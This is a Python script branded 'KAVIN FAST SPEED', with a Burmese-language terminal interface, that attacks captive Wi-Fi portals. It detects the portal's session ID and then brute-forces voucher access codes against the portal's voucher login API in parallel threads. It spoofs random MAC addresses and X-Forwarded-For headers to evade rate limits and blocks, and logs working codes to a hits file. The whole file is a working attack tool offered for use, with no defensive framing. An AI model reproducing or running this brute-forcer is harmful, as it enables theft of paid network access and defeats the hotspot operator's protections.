# =====================================================================
# lakaw.py (KAVIN FAST SPEED - Modern Hacker Terminal UI)
# =====================================================================

import os
import time
import json
import random
import string
import sqlite3
import re
import html
import requests
import urllib3
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live

import license as _license

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "lakaw_data.db"
STATE_FILE = "lakaw_state.json"
HITS_FILE = "hits.txt"

# ⚡ Speed Settings
MAX_WORKERS = 5        
BASE_SLEEP_MIN = 0.1   
BASE_SLEEP_MAX = 0.3   
RATE_LIMIT_SLEEP = 60 
NETWORK_RETRY_SLEEP = 1.0
SESSION_REFRESH_SLEEP = 3.0

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36"})
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
session.mount('http://', adapter)
session.mount('https://', adapter)

db_lock = threading.Lock()

def generate_random_mac():
    first_octet = random.choice([0x00, 0x02, 0x04, 0x06, 0x0A, 0x0E])
    mac = [first_octet] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(map(lambda x: "%02x" % x, mac)).upper()

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception: return "00:00:00"

def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict): result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str): result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10, check_same_thread=False)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception: return None

def is_tried(conn, code):
    if conn is None: return False
    try:
        with db_lock: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        with db_lock:
            conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
            conn.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits, custom_url="", scan_method="random", session_id="", is_manual=False):
    try:
        with open(STATE_FILE, "w") as f: json.dump({"mode": mode, "tested": tested, "hits": hits, "custom_url": custom_url, "scan_method": scan_method, "session_id": session_id, "is_manual": is_manual}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9_-]+)", value, re.IGNORECASE)
        if m: return m.group(1)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    return None

def fetch_session(custom_url=""):
    if custom_url:
        try:
            r = session.get(custom_url, timeout=5, allow_redirects=True, verify=False)
            p = urlparse(r.url)
            portal_base = f"{p.scheme}://{p.netloc}"
            sid = extract_session(r.url) or extract_session(r.text)
            if sid: return portal_base, sid
            return portal_base, "dummy_session"
        except Exception: pass

    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
        "http://detectportal.firefox.com/success.txt"
    ]
    
    for url in probes:
        try:
            fake_mac = generate_random_mac()
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Client-Mac": fake_mac,
                "X-Forwarded-For": f"192.168.110.{random.randint(2, 254)}"
            }
            r = session.get(url, timeout=5, allow_redirects=True, verify=False, headers=headers)
        except Exception:
            continue
        
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc or "firefox.com" in p.netloc:
                continue
            
            portal_base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            
            for c in cands:
                sid = extract_session(c)
                if sid: return portal_base, sid
            
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return portal_base, sid
            except Exception: pass
            
            if portal_base:
                return portal_base, "dummy_session"
                
        except Exception: continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    fake_mac = generate_random_mac()
    headers = {
        "Content-Type": "application/json", 
        "Origin": portal_base,
        "Client-Mac": fake_mac,
        "X-Forwarded-For": f"192.168.110.{random.randint(2, 254)}"
    }
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=2.5, verify=False)
        if r.status_code == 429: return "__RATE_LIMITED__"
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception: return "__NETWORK_ERROR__"

seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return str(current).zfill(length)
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""

# ★ Modern Hacker Terminal UI
def get_dashboard_renderable(mode, current_code, tested, elapsed, status, hits, logs, speed, is_manual):
    # အရောင် သတ်မှတ်ခြင်း
    status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "yellow")
    mode_display = "MANUAL" if is_manual else "AUTO"
    
    # မျက်နှာပြင် အလှဆင်ခြင်း
    dash = Text()
    dash.append("  ╔══════════════════════════════════════════╗\n", style="bold cyan")
    dash.append("  ║      ⚡ K A V I N   F A S T   S P E E D     ║\n", style="bold bright_magenta")
    dash.append("  ╚══════════════════════════════════════════╝\n", style="bold cyan")
    dash.append("\n")
    
    # အချက်အလက်များ
    dash.append(f"  ▸ {str('CODE').ljust(10)}: ", style="bold white")
    dash.append(f"{current_code}\n", style="bold bright_green")
    
    dash.append(f"  ▸ {str('TRIED').ljust(10)}: ", style="bold white")
    dash.append(f"{tested:,}\n", style="bold yellow")
    
    dash.append(f"  ▸ {str('SPEED').ljust(10)}: ", style="bold white")
    dash.append(f"{speed:.1f} c/m\n", style="bold cyan")
    
    dash.append(f"  ▸ {str('STATUS').ljust(10)}: ", style="bold white")
    dash.append(f"{status.upper()}\n", style=f"bold {status_color}")
    
    dash.append(f"  ▸ {str('TIME').ljust(10)}: ", style="bold white")
    dash.append(f"{elapsed}\n", style="bold blue")
    
    dash.append(f"  ▸ {str('HITS').ljust(10)}: ", style="bold white")
    dash.append(f"{len(hits)}\n", style="bold magenta")
    
    dash.append(f"  ▸ {str('METHOD').ljust(10)}: ", style="bold white")
    dash.append(f"{mode_display}\n", style="bold yellow")
    
    dash.append("\n")
    dash.append("  ─── [ 📜 TERMINAL LOGS ] ─────────────────────\n", style="dim cyan")
    if logs:
        for lg in logs[-3:]:
            dash.append(f"  {lg}\n")
    else:
        dash.append("  > Waiting for incoming data...\n", style="dim")
        
    dash.append("\n")
    dash.append("  ─── [ 💎 FOUND CODES ] ───────────────────────\n", style="dim yellow")
    last_hits = hits[-3:]
    if last_hits:
        for i, h in enumerate(last_hits, 1):
            c = h.get("code", "") if isinstance(h, dict) else h
            t = h.get("time", "--:--:--") if isinstance(h, dict) else "--:--:--"
            dash.append(f"  [{i}] ", style="dim white")
            dash.append(f"{c}", style="bold bright_green")
            dash.append(f" @ {t}\n", style="dim cyan")
    else:
        dash.append("  > Searching the database...\n", style="dim")
        
    dash.append("\n  ══════════════════════════════════════════════\n", style="dim cyan")
    return dash
def scan_loop(mode, length, portal_base=None, session_id=None, is_manual=False, scan_method="random", start_tested=0, start_hits=None):
    global seq_counter
    if scan_method == "sequential" and start_tested > 0: seq_counter = start_tested

    mode_str = f"{mode}_{length}"
    hits = normalize_hits(start_hits) if start_hits else []
    running_logs, tested = [], start_tested
    start_time = time.time()
    
    current_portal = portal_base if is_manual else None
    current_session = session_id if is_manual else None
    
    net_error_streak = 0
    conn = init_db()
    current_code = [""]
    current_status = ["Init"]

    def push_log(msg): 
        running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")
        if len(running_logs) > 3: running_logs.pop(0)

    live = Live(get_dashboard_renderable(mode_str, "", tested, "00:00:00", "Init", hits, running_logs, 0.0, is_manual), refresh_per_second=4, screen=False)
    
    with live:
        try:
            push_log("[bright_cyan]Engine Started...[/bright_cyan]")
            while True:
                try:
                    if not current_session or not current_portal:
                        if is_manual:
                            current_status[0] = "Limit"
                            push_log("[bold red]Session သက်တမ်းကုန်သွားပါပြီ။[/bold red]")
                            time.sleep(3)
                            return
                        else:
                            current_status[0] = "Init"
                            push_log("[yellow]Session ရှာနေပါသည်...[/yellow]")
                            current_portal, current_session = fetch_session()
                            
                            if not current_session:
                                push_log("[red]Session မတွေ့ပါ။ ပြန်ရှာမည်...[/red]")
                                time.sleep(SESSION_REFRESH_SLEEP)
                                continue 
                            
                            push_log(f"[bold green]Session တွေ့ပါပြီ![/bold green]")
                            net_error_streak = 0

                    batch_codes = []
                    while len(batch_codes) < MAX_WORKERS * 2:
                        c = gen_code(mode, length, scan_method)
                        if c and not is_tried(conn, c):
                            mark_tried(conn, c)
                            batch_codes.append(c)

                    if not batch_codes: continue
                    success_hit = False

                    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                        futures = {executor.submit(test_code, current_portal, current_session, code): code for code in batch_codes}

                        for future in as_completed(futures):
                            code = futures[future]
                            tested += 1
                            current_code[0] = code
                            
                            try: res = future.result()
                            except Exception: continue

                            if res == "__RATE_LIMITED__":
                                current_status[0] = "Limit"
                                push_log(f"[bold red]🛡️ Rate Limited![/bold red]")
                                time.sleep(RATE_LIMIT_SLEEP)
                                current_session = None
                                success_hit = True
                                break

                            low = (res or "").lower()
                            
                            if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
                                current_status[0] = "Limit"
                                push_log(f"[bold red]🛡️ Block Detected![/bold red]")
                                time.sleep(RATE_LIMIT_SLEEP)
                                current_session = None
                                success_hit = True
                                break

                            if "session timed out" in low or "session timeout" in low or '"session":null' in low:
                                push_log("[yellow]Session သက်တမ်းကုန်ပါပြီ။[/yellow]")
                                current_session = None
                                break

                            if '"success":true' in low or '"authresult":"1"' in low:
                                existing = hits_codes_only(hits)
                                if code not in existing:
                                    now_str = time.strftime("%H:%M:%S")
                                    hits.append({"code": code, "time": now_str})
                                    push_log(f"[bold bright_green]✨ FOUND: {code}[/bold bright_green]")
                                    try:
                                        with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
                                    except Exception: pass
                                    save_state(mode_str, tested, hits, current_portal, scan_method, current_session or "", is_manual)
                                current_status[0] = "Active"
                                success_hit = True
                                break
                            
                            current_status[0] = "Active"
                            time.sleep(random.uniform(BASE_SLEEP_MIN, BASE_SLEEP_MAX))

                    if success_hit: time.sleep(0.5)
                    
                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                    live.update(get_dashboard_renderable(mode_str, current_code[0], tested, format_time(elapsed), current_status[0], hits, running_logs, speed, is_manual))

                except KeyboardInterrupt: raise
                except Exception:
                    time.sleep(NETWORK_RETRY_SLEEP)
                    continue
        except KeyboardInterrupt: pass

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit")
        console.print()
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"):
            console.print("  [bold red]Invalid![/bold red]"); time.sleep(1); continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print(f"  Mode: [bold yellow]{mode.upper()}[/bold yellow]\n")
        for i in range(6, 10): console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] ⚡ {i} Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅ Back\n")
        length = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if length == "0": return None
        if length not in ("6", "7", "8", "9"):
            console.print("  [bold red]Invalid![/bold red]"); time.sleep(1); continue
        return int(length)

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"):
            console.print("  [bold red]Invalid![/bold red]"); time.sleep(1); continue
        return {"1": "random", "2": "sequential"}[choice]

def ask_session_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔄  Auto Detect (Session အလိုအလျောက် ရှာမည်)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📝  Manual Input (Session ကိုယ်တိုင် ထည့်မည်)")
        console.print("  [bold bright_red]0.[/bold bright_red] ⬅  Back")
        console.print()
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()

        if choice == "0": return None
        if choice == "1": return ("auto", None, None)
        if choice == "2":
            clear_screen()
            console.print("  [bold yellow]🔗 Portal URL / Session ID ထည့်ပါ[/bold yellow]\n")
            console.print("  [dim]ဥပမာ - http://192.168.1.1:2060/login?sessionId=abc12345...[/dim]")
            console.print("  [dim]သို့မဟုတ် Session ID ကိုပဲ ရိုက်ထည့်ပါ (ဥပမာ - abc12345...)[/dim]\n")
            
            user_input = Prompt.ask("  [bright_cyan]➜ Paste Here[/bright_cyan]").strip()
            if not user_input: continue

            sid = extract_session(user_input)
            base = None
            try:
                p = urlparse(user_input)
                if p.scheme and p.netloc: base = f"{p.scheme}://{p.netloc}"
            except: pass

            if not sid and not base:
                sid = user_input
                base = Prompt.ask("  [bright_cyan]➜ Portal Base URL ထည့်ပါ (ဥပမာ - http://192.168.1.1:2060)[/bright_cyan]").strip()

            if sid and base: return ("manual", base, sid)
            else:
                console.print("  [bold red]Session ID (သို့) URL မှားယွင်းနေပါသည်။[/bold red]")
                time.sleep(2)
                continue
        console.print("  [bold red]Invalid![/bold red]"); time.sleep(1)

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            custom_url = state.get("custom_url", "")
            scan_method = state.get("scan_method", "random")
            session_id = state.get("session_id", "")
            is_manual = state.get("is_manual", False)

            show_banner()
            console.print("  [bold yellow]💾 Previous Session Found[/bold yellow]\n")
            console.print(f"  Mode   : [bold white]{m.upper()} {l}[/bold white]")
            console.print(f"  Method : [bold white]{scan_method.upper()}[/bold white]")
            console.print(f"  Tested : [bold white]{tested:,}[/bold white]")
            console.print(f"  Hits   : [bold green]{len(hits)}[/bold green]\n")
            
            ans = Prompt.ask("  [bright_cyan]➜ Resume? (y/n)[/bright_cyan]").strip().lower()
            if ans in ("", "y", "yes"):
                if is_manual and custom_url and session_id:
                    scan_loop(m, int(l), custom_url, session_id, is_manual=True, scan_method=scan_method, start_tested=tested, start_hits=hits)
                else:
                    scan_loop(m, int(l), is_manual=False, scan_method=scan_method, start_tested=tested, start_hits=hits)
                return
            else: clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return

        length = ask_length(mode)
        if length is None: continue

        method = ask_scan_method()
        if method is None: continue

        sess_method = ask_session_method()
        if sess_method is None: continue
        
        method_type, p_base, s_id = sess_method

        if method_type == "manual":
            save_state(f"{mode}_{length}", 0, [], p_base, method, s_id, True)
            scan_loop(mode, length, p_base, s_id, is_manual=True, scan_method=method)
        else:
            save_state(f"{mode}_{length}", 0, [], "", method, "", False)
            scan_loop(mode, length, is_manual=False, scan_method=method)
        return

def main():
    if not _license.check_approval(): 
        return
        
    try: run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            console.print("\n\n")
            console.print(Text("🙏 ကျေးဇူးတင်ပါတယ်ဗျ။ ✨", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(2)
        except BaseException: pass

if __name__ == "__main__":
    main()